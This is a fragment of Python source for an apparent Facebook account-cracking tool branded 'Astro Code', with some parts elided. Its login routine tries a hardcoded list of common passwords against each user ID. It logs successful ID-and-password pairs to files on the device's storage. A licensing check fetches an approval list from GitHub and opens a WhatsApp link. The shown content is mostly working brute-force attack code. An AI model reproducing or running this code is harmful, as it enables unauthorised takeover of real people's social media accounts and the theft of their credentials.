#------------------------------------------------------
# Tool Made By @Astro_Code_GBot
# Encoding: Galaxy Edit'z
# Decode By @Astro_Code_GBot
# Channel @galaxy_90x
#------------------------------------------------------
#----------------------------[IMPORT/MODULE]-----------------------------------#
...
logo = (                                                                                                    
      ...
      d88b                     ,d                                 `8b         d8'  ""               
     d8'`8b                    88                                  `8b       d8'                    
    d8'  `8b      ,adPPYba,  MM88MMM  8b,dPPYba,   ,adPPYba,        `8b     d8'    88  8b,dPPYba,   
   d8YaaaaY8b     I8[    ""    88     88P'   "Y8  a8"     "8a        `8b   d8'     88  88P'    "8a  
  d8""""""""8b     `"Y8ba,     88     88          8b       d8         `8b d8'      88  88       d8  
 d8'        `8b   aa    ]8I    88,    88          "8a,   ,a8"          `888'       88  88b,   ,a8"  
d8'          `8b  `"YbbdP"'    "Y888  88           `"YbbdP"'            `8'        88  88`YbbdP"'   
                                                                                       88           
                                                                                       88           
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 [✪] Author :  Astro Code 
...
def pp():
	...
	try:
			...
			#li = ''.join(li)
			system = requests.get("https://github.com/galaxy90v8/Astro-Code/blob/main/Astro.txt").text 
			...
			if ky in system:
				...
				xx='⪼Selected=='
				os.system('xdg-open https://wa.me/+8801912933782?text='+str(ky)+xx+lol)
				pp()
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r\033[1;37m [ASTRO-OLD] \x1b[1;97m{loop} \x1b[1;92m{len(oks)}")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","786786","60708090","FuckYou@1234","12121212","sakil@1234","rakib@1234","bangladesh","Bangladeah",]:
            headers = {
            ...
            if "session_key" in rp:
                print(f"\r\r{ G}[ASTRO-OK]  {G}{uid} {A}|{G} {pw}")
                open("/sdcard/ASTRO-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r {G}[ASTRO-OK]  {G}{uid} {A}|{G} {pw}")
                open("/sdcard/ASTRO-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
